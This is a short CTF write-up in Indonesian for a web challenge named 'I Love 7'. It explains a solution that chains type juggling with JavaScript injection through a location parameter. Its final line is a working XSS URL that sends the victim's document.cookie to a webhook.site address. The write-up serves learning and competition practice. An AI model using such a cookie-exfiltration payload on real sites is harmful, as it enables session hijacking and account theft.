# I Love 7

Description:
```
"7 * 1 = 7
7 * 2 = 14
7 * 3 = 21
7 * ? = ??

Link: xxx
Author: daffainfo"
```
### Cara Solve

* Diawali dengan Type Juggling (Payload harus diawali dengan angka)

    Referensi: https://twitter.com/KN0X55/status/1738004376353214636

* Kemudian diikuti dengan menggunakan tips bug bounty dari tweet [ini](https://twitter.com/Rhynorater/status/1696862832841916679) atau bisa melihat penjelasannya di video [LiveOverflow](https://www.youtube.com/watch?v=3zShGLEqDn8)

    ```
    http://app:8080/?digit=7,location=%22javascript:location.replace\x28\x22https://webhook.site/55c3d793-e738-4718-98b3-3bb9d3b5208f/?\x22%2bdocument.cookie\x29%22
    ```